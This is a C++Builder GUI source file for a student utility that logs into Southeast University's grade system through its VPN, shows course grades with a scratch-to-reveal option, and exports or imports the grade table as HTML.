void __fastcall TMainForm::btnReAddCoursesClick(TObject *Sender)
{
    if(courseIndex != 0){
        int i=MessageDlg("此功能仅应在登录一次没有获取到任何课程时使用。\n如已经获取到课程，使用此功能容易导致课程重复。\n继续吗？",mtWarning,mbOKCancel,1);
        //ok=1, cancel=2
        if(i==2){
            return;
        }
    }
    CppWebBrowser1->Stop();
    Sleep(250);
    doMonitor=0;
    loginSuccess=2;
    CppWebBrowser1->Navigate(L"http://xk.urp.seu.edu.cn/studentService/cs/stuServe/studentExamResultQuery.action");
    Sleep(250);
    btnReAddCourses->Enabled=false;
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitExclAllClick(TObject *Sender)
{
    for(int j=1; j<=courseIndex; j++) {
        StringGrid1->Cells[6][j]="";
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitIncludeAllClick(TObject *Sender)
{
    for(int j=1; j<=courseIndex; j++) {
        if(StringGrid1->Cells[2][j]=="未评教")continue;
        StringGrid1->Cells[6][j]="Yes";
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitEditCourseClick(TObject *Sender)
{
    frmEditCourse->Left = MainForm->Left + StringGrid1->Left + 20;//mouX - 80;
    frmEditCourse->Top = MainForm->Top + StringGrid1->Top + 120;// + mouY;
    frmEditCourse->ShowModal();
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edNameEnter(TObject *Sender)
{
    if(edName->Text == "课程名（可选）"){
        edName->Text="";
        edName->Font->Color = clWindowText;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edNameExit(TObject *Sender)
{
    if(edName->Text.IsEmpty() || edName->Text == "课程名（可选）"){
        edName->Text = "课程名（可选）";
        edName->Font->Color = clGrayText;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edXfEnter(TObject *Sender)
{
    if(((TEdit*)Sender)->Text == "整数"){
        ((TEdit*)Sender)->Text="";
        ((TEdit*)Sender)->Font->Color = clWindowText;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edXfExit(TObject *Sender)
{
    if(((TEdit*)Sender)->Text.IsEmpty()){
        ((TEdit*)Sender)->Text="整数";
        ((TEdit*)Sender)->Font->Color = clGrayText;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::Label14Click(TObject *Sender)
{
//    frmDebug->ShowModal();
//    htmContent=edDebug->Lines->Text;
//    getCourseList();


}
//---------------------------------------------------------------------------


void __fastcall TMainForm::chkScratchClick(TObject *Sender)
{
    if(Sender==chkNormal&&chkNormal->Checked==true&&courseIndex>0)
    {
        MessageDlg("即将显示所有成绩和绩点，请做好心理准备！",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
    }
    StringGrid1->Repaint();
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::StringGrid1SelectCell(TObject *Sender, int ACol,
      int ARow, bool &CanSelect)
{
    CanSelect=false;
}
//---------------------------------------------------------------------------
AnsiString filename;
int yesno;
void __fastcall TMainForm::btnOutputClick(TObject *Sender)
{
    Form6->ShowModal();
    if(yesno){
        ofstream outfile;
        outfile.open(filename.c_str());
        outfile<<"<TABLE id=table1 width=\"100%\">\
                  <TBODY>\
                  <TR>\
                  <TD align=left><FONT class=Context_line>您的位置: 成绩服务 &gt; 学生成绩查询</FONT></TD></TR></TBODY></TABLE><BR>\
                  <P style=\"COLOR: #ff0000; MARGIN-LEFT: 30px\">&nbsp;&nbsp;&nbsp;&nbsp;注:1、\"未评教\"表示该课尚未进行教学评估<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、学时学分以年级专业教学计划为准</P><BR>\
                  <TABLE id=table2 width=\"90%\" align=center bgColor=#d8efff border=1>\
                  <TBODY>\
                  <TR>\
                  <TD width=\"10%\" align=center>序号</TD>\
                  <TD width=\"10%\" align=center>学年学期</TD> \
                  <TD width=\"10%\" align=center>课程代码</TD>\
                  <TD width=\"20%\" align=center>课程名称</TD>\
                  <TD width=\"10%\" align=center>学分</TD> \
                  <TD width=\"10%\" align=center>成绩</TD> \
                  <TD width=\"10%\" align=center>成绩性质</TD> \
                  <TD width=\"10%\" align=center>课程性质</TD></TR>" ;
        int index = 1;
        while(index<=courseIndex){
            outfile<<("<TR onmouseover=\"this.style.backgroundColor='#bbbbbb'\" onmouseout=\"this.style.backgroundColor=''\">\
                      <TD width=\"10%\" align=center>"+AnsiString(index)+"</TD>\
                      <TD width=\"10%\" align=center>NODATA</TD>\
                      <TD width=\"10%\" align=center>NODATA</TD>\
                      <TD width=\"20%\" align=center>").c_str();
            outfile<<StringGrid1->Cells[0][index].c_str();
            outfile<<"&nbsp;</TD>\
                      <TD width=\"10%\" align=center>";
            outfile<<StringGrid1->Cells[1][index].c_str();
            outfile<<"&nbsp;</TD>\
                      <TD width=\"10%\" align=center>";
            outfile<<StringGrid1->Cells[2][index].c_str();
            outfile<<"&nbsp;</TD>\
                      <TD width=\"10%\" align=center>";
            outfile<<StringGrid1->Cells[3][index].c_str();
            outfile<<"&nbsp;</TD>\
                      <TD width=\"10%\" align=center>";
            outfile<<StringGrid1->Cells[4][index].c_str();
            outfile<<"</TD></TR>";
            index++;
        }
        outfile<<"</TBODY></TABLE><BR>";
        outfile.close();
        MessageDlg("导出完成！",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        Label8->Caption="已导出课程";
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnInputClick(TObject *Sender)
{
    Form7->ShowModal();
    if(yesno){
        ifstream in;
        in.open(filename.c_str());
        int begin_byte = in.tellg();
        in.seekg (0, ios::end);
        int end_byte = in.tellg();
        int total_bytes = end_byte - begin_byte;
        in.seekg(0);
        char *message = new char[total_bytes + 1];
        in.read(message, total_bytes);
        in.close();
        htmContent = AnsiString(message);
        getCourseList();
        Label8->Caption="已导入课程";
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::StringGrid1MouseWheelDown(TObject *Sender,
      TShiftState Shift, TPoint &MousePos, bool &Handled)
{
    if(StringGrid1->TopRow<139)StringGrid1->TopRow += 3;
    else StringGrid1->TopRow=139;
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::StringGrid1MouseWheelUp(TObject *Sender,
      TShiftState Shift, TPoint &MousePos, bool &Handled)
{
    if(StringGrid1->TopRow>3)StringGrid1->TopRow -= 3;
    else StringGrid1->TopRow=1;
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::FormMouseWheel(TObject *Sender,
      TShiftState Shift, int WheelDelta, TPoint &MousePos, bool &Handled)
{
    StringGrid1->SetFocus();
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::StringGrid1CellProps(TObject *Sender,
      TCanvas *Canvas, TAlignment &Alignment, AnsiString &CellText,
      TGridDrawState AState, int Row, int Col)
{
    if((chkScratch->Checked == true||chkGuess->Checked==true)&&(Col==2||Col==5)&&Row>0&&Row<=courseIndex){
        if(scratched[Row-1]||StringGrid1->Cells[2][Row]=="未评教"){
            if(Row%2==1&&!(oper==1&&operR==Row&&(Col==0)))Canvas->Brush->Color=clGradientInactiveCaption;
            else Canvas->Brush->Style=bsClear;
            Font->Color=clBlack;
        }
        else {
            Canvas->Brush->Color=clBlack;
            Font->Color=clBlack;
        }
        return;
    }
    if(Row%2==1&&(!(oper==1&&operR==Row&&(Col==0)))&&Row<=courseIndex){//&&(courseIndex%2==0?Row<=courseIndex+1:Row<=courseIndex)){
        Canvas->Brush->Color=clGradientInactiveCaption;
        Font->Color=clBlack;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::StringGrid1DblClick(TObject *Sender)
{
    StringGrid1->MouseToCell(mouX, mouY, aCol, aRow);
    if(aRow<=courseIndex&&aRow>0&&aCol!=6)
    {
        frmEditCourse->Left = MainForm->Left + StringGrid1->Left + 20;// + mouX - 80;
        frmEditCourse->Top = MainForm->Top + StringGrid1->Top + 120;// + mouY;
        frmEditCourse->ShowModal();
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edGrKeyPress(TObject *Sender, char &Key)
{
    if(Key==8)return;
    if(Key==13)return;
    if(Key>'9'||Key<'0'){ Key=0; return; }
}
//---------------------------------------------------------------------------


void __fastcall TMainForm::CppWebBrowser1NavigateError(TObject *Sender,
      LPDISPATCH pDisp, Variant *URL, Variant *Frame, Variant *StatusCode,
      VARIANT_BOOL *Cancel)
{
    MessageDlg("如果无法联网登录，请尝试使用VPN！",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnVPNClick(TObject *Sender)
{
    if(edCardId->Text.ToIntDef(-1)>=300000000||edCardId->Text.ToIntDef(-1)<200000000)
    {
        MessageDlg("请检查一卡通号输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    if(edCardPw->Text.IsEmpty()){
        MessageDlg("请检查一卡通密码输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    CppWebBrowser1->Navigate(L"about:blank");
    CppWebBrowser1->Stop();
    needRefreshVercode=1;
    btnLogin->Enabled=false;
    btnGetVercode->Enabled=false;
    Sleep(500);
    doMonitor=-2;
    //https://vpn2.seu.edu.cn/dana-na/auth/url_default/login.cgi
    //tz_offset=480&username=Username&password=Password&realm=vpn_ids&btnSubmit=%E7%99%BB%E5%BD%95
    Label8->Caption="正在登录VPN...";
    WebPostData(CppWebBrowser1,"https://vpn2.seu.edu.cn/dana-na/auth/url_default/login.cgi","tz_offset=480&username="+edCardId->Text+"&password="+edCardPw->Text+"&realm=vpn_ids&btnSubmit=%E7%99%BB%E5%BD%95");
    //https://vpn2.seu.edu.cn/studentService/,DanaInfo=xk.urp.seu.edu.cn+getCheckCode
    //https://vpn2.seu.edu.cn/studentService/system/,DanaInfo=xk.urp.seu.edu.cn+login.action
    //https://vpn2.seu.edu.cn/studentService/cs/stuServe/,DanaInfo=xk.urp.seu.edu.cn+studentExamResultQuery.action
}
//---------------------------------------------------------------------------


